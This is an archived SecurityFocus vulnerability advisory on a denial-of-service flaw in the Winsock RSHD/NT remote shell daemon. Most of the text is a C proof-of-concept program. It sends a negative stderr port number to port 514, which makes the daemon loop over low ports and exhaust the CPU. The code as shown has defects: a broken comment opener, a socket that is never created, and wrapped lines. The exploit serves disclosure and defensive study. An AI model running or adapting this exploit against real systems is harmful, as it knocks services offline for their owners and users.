source: http://www.securityfocus.com/bid/3659/info

Winsock RSHD/NT is a Remote Shell Daemon for Windows NT and Windows 2000. It uses the standard Unix rsh and rcp commands. rsh (ie "remote shell") allows the execution of a non-interactive program on another system running the server component, 'rshd'. The daemon listens for connections coming from an rsh command through TCP/IP, and, on receiving a connection, validates access and executes the specified program.

Upon connecting to the daemon, rsh will supply a port number for the daemon to send standard error data. If the port number specified is invalid, Winsock RSHD/NT will attempt to connect to the invalid port and all port numbers below 1024 (including negative port numbers). Potentially consuming CPU resources and leading to a denial of service.

*
** WRSHDNT 2.20.00 CPU overusage demo
** jimmers@yandex.ru
*/

#define HOST    "localhost"
#define PORT    514

#include <stdio.h>
#include <winsock2.h>

int main(int argc, char * argv[]){
        SOCKET s;
        WSADATA WSAData;
        LPHOSTENT lpHostEnt;
        SOCKADDR_IN sockAddr;
        int res, on = 1;
        char *stderr_port = "-666";
        char *local_user  = "Administrator";
        char *remote_user = "root";
        char *cmd = "help";

        res = WSAStartup( MAKEWORD( 2, 2 ),
&WSAData);
        if(res != 0){
                res = WSAGetLastError();
                printf("WSAStartup() failed,
WSAGetLastError: %d\n", res);
                return 1;
        }

        lpHostEnt = gethostbyname(HOST);
        if(lpHostEnt == NULL){
                res = WSAGetLastError();
                printf("gethostbyname() failed,
WSAGetLastError: %d\n", res);
                WSACleanup();
                return 1;
        }

        sockAddr.sin_family     = AF_INET;
        sockAddr.sin_port       = htons(PORT);
        sockAddr.sin_addr       = *((LPIN_ADDR)
*lpHostEnt->h_addr_list);

        res = connect(s, (PSOCKADDR)
&sockAddr, sizeof(sockAddr));
        if(res != 0){
                res = WSAGetLastError();
                printf("connect() failed,
WSAGetLastError: %d\n", res);
                WSACleanup();
                return 1;
        }

        Sleep(400);
        res = send(s, stderr_port, strlen
(stderr_port)+1, 0);
        if(res == SOCKET_ERROR){
                res = WSAGetLastError();
                printf("send(stderr_port) failed,
WSAGetLastError: %d\n", res);
                WSACleanup();
                return 1;
        }

        printf("send(stderr_port): %d\n", res);

        Sleep(400);
        res = send(s, local_user, strlen(local_user)
+1, 0);
        if(res == SOCKET_ERROR){
                res = WSAGetLastError();
                printf("send(local_user) failed,
WSAGetLastError: %d\n", res);
                WSACleanup();
                return 1;
        }
        printf("send(local_user): %d\n", res);


        Sleep(400);
        res = send(s, remote_user, strlen
(remote_user)+1, 0);
        if(res == SOCKET_ERROR){
                res = WSAGetLastError();
                printf("send(remote_user) failed,
WSAGetLastError: %d\n", res);
                WSACleanup();
                return 1;
        }
        printf("send(remote_user): %d\n", res);


        Sleep(400);
        res = send(s, cmd, strlen(cmd)+1, 0);
        if(res == SOCKET_ERROR){
                res = WSAGetLastError();
                printf("send(cmd) failed,
WSAGetLastError: %d\n", res);
                WSACleanup();
                return 1;
        }
        printf("send(cmd): %d\n", res);

        WSACleanup();
        return 0;
}